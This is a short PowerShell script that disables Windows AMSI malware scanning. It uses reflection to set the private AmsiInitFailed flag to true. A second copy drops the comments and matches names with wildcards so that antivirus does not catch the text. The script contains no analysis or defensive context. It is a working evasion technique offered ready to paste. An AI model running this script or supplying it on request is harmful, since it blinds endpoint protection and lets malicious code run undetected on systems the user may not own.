# Powershell script to set AmsiInitFailed to true to disable AMSI
# DO NOT COPY-PASTE HERE, THE COMMENTS WILL TRIGGER AV DUE TO AMSIUTILS BEING MENTIONED

$niks = $null
$waar = $true

# loop through all assembly types to get the AmsiUtils class
$a=[Ref].Assembly.GetTypes()
Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}}

# loop through all non-public, static attributes in the AmsiUtils class and grab the AmsiInitFailed field
$d=$c.GetFields('NonPublic,Static')
Foreach($e in $d) {if ($e.Name -like "*itFailed") {$f=$e}}

# set the AmsiInitFailed field to true
$f.SetValue($niks, $waar)


### COPY-PASTE HERE

$niks = $null
$waar = $true

$a=[Ref].Assembly.GetTypes()
Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}}

$d=$c.GetFields('NonPublic,Static')
Foreach($e in $d) {if ($e.Name -like "*itFailed") {$f=$e}}

$f.SetValue($niks, $waar)
